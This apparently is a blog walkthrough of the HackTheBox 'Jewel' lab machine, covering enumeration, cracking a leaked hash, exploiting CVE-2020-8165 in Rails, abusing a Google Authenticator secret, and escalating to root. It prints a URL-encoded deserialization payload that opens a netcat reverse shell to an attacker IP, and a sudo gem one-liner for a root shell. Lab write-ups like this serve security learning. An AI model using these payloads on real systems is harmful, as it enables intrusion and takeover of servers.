---
published: true
title: Hackthebox jewel walkthrough
date: 2021-11-26 03:29:00 +0200
categories: [HTB]
tags: HTB
---
<h1>Scanning</h1>

<img src="https://i.ibb.co/dbW2t85/Screenshot-from-2021-02-13-17-25-59.png" alt="Screenshot-from-2021-02-13-17-25-59" border="0"> 

<p>We found port 22 for ssh and port 8000,8080 for HTTP where port 8000</p>

<p>Let`s add jewel.htb in our hosts </p>

<img src="https://i.ibb.co/5v1Xjw8/Screenshot-from-2021-02-13-17-54-04.png" alt="Screenshot-from-2021-02-13-17-54-04" border="0">
<h2>Enumeration</h2>
<h2>Port 8000</h2>
<img src="https://i.ibb.co/kxyH5Kj/Screenshot-from-2021-02-13-18-01-04.png" alt="Screenshot-from-2021-02-13-18-01-04" border="0">

<h2>port 8080</h2>
<img src="https://i.ibb.co/37D1z6D/Screenshot-from-2021-02-13-18-01-35.png" alt="Screenshot-from-2021-02-13-18-01-35" border="0">

<p>Let`s enumerate the BLOG!</p>
<img src="https://i.ibb.co/FmT1Ppz/Bill.png" alt="Bill" border="0">
<img src="https://i.ibb.co/s9vmvfL/Jennifer.png" alt="Jennifer" border="0">
<p>We found 2 user Bill,Jennifer </p>

<p>Let`s enumerate the REPO </p>
<img src="https://i.ibb.co/0fNWrZK/Screenshot-from-2021-02-13-18-15-14.png" alt="Screenshot-from-2021-02-13-18-15-14" border="0">

<p>After some enumerating i found SQL file "bd.sql" and i got some hashes</p>
<img src="https://i.ibb.co/d08S7kv/Screenshot-from-2021-02-13-18-18-20.png" alt="Screenshot-from-2021-02-13-18-18-20" border="0">

<p>I cracked Bill hash "spongebob" but couldn`t login, let`s countinue enumeration</p>
<img src="https://i.ibb.co/JKpyJ9q/Screenshot-from-2021-02-13-18-27-25.png" alt="Screenshot-from-2021-02-13-18-27-25" border="0">
<h2>User flag</h2>
<p>It`s using ruby '2.5.5' , let`s search for an exploit</p>
<p>After searching i found a CVE</p><a href="https://github.com/masahiro331/CVE-2020-8165">CVE-2020-8165</a> 
<p>I tested all the fields and i found that the vulnerable input in updating user fields</p>
<p>Payload <blockquote>%04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%09%3A%0E%40instanceo%3A%08ERB%08%3A%09%40srcI%22U%60rm+%2Ftmp%2Ff%3Bmkfifo%20%2ftmp%2ff%3bcat%20%2ftmp%2ff%7c%2fbin%2fsh+-i+2%3e%261%7cnc+10.10.XX.XX+9001+%3e%2Ftmp%2ff%60%06%3A%06ET%3A%0E%40filenameI%22%061%06%3B%09T%3A%0C%40linenoi%06%3A%0C%40method%3A%0Bresult%3A%09%40varI%22%0C%40result%06%3B%09T%3A%10%40deprecatorIu%3A%1FActiveSupport%3A%3ADeprecation%00%06%3B%09T</blockquote></p>
<p>Change the ip to your ip</p>
<img src="https://i.ibb.co/52wq0rs/web10.png" alt="web10" border="0">
<img src="https://i.ibb.co/GRGjx1b/cmd2.jpg" alt="cmd2" border="0">
<pre>
<span class="k">$ su bill</span>
<span class="na">Password: </span>
<span class="k">bill@jewel:~$ whoami</span>
<span class="na">bill</span>
</pre>
<pre>
<p>The password is "spongebob" we cracked it 
if you remember </p><p>Let`s upgrade our shell </p>
</pre>
<img src="https://i.ibb.co/D4qw4cq/ssh.png" alt="ssh" border="0">
<img src="https://i.ibb.co/cCN66PD/ssshhs1.jpg" alt="ssshhs1" border="0">

<h2>Root flag</h2>
<p>I listed the directory as 1st step of enumeration and i found Google auth, it look like the admin use 2FA</p>
<img src="https://i.ibb.co/NydTvQn/Google-autyh.jpg" alt="Google-autyh" border="0">
<p>Let`s get the secret key and use google auth</p>
<img src="https://i.ibb.co/RghXZSW/cmd10.jpg" alt="cmd10" border="0">
<img src="https://i.ibb.co/GTBN0Wz/auth-1.jpg" alt="auth-1" border="0">
<img src="https://i.ibb.co/QcTKwXY/auth-2.jpg" alt="auth-2" border="0">
<p>Let`s generate the OTP</p>
<img src="https://i.ibb.co/89GyndH/web14.jpg" alt="web14" border="0">
<p>Let`s use the OTP</p>
<img src="https://i.ibb.co/MM9SNFy/cmd11.jpg" alt="cmd11" border="0">
<p>Looks like something wrong.</p>
<p>This step made my mind blow off , i searched a lot and asked for a nudge at HTB discord server</p>
<p>Someone told me it`s about sync with the victim box, let`s see</p>
<img src="https://i.ibb.co/PCjNDwg/cmd123.jpg" alt="cmd123" border="0">.
<img src="https://i.ibb.co/PCjNDwg/cmd123.jpg" alt="cmd123" border="0">
<p>Timezone is different, let`s set our machine to the victim timezone</p>
<img src="https://i.ibb.co/PxmmR2H/cmd163.jpg" alt="cmd163" border="0">
<img src="https://i.ibb.co/Mn5tVyQ/cmd1645.jpg" alt="cmd1645" border="0">
<p>Let`s try to escalate privilege again</p>
<img src="https://i.ibb.co/1M7W8dv/priv.jpg" alt="priv" border="0">
<p>Bam ! it`s working</p>
<pre>
<span class="k">sudo gem open -e "/bin/sh -c /bin/sh" rdoc</span>
                                                                </pre>
<img src="https://i.ibb.co/JzTS9cn/cmd19.jpg" alt="cmd19" border="0">

<p>Thanks for reading i hope you enjoyed </p>
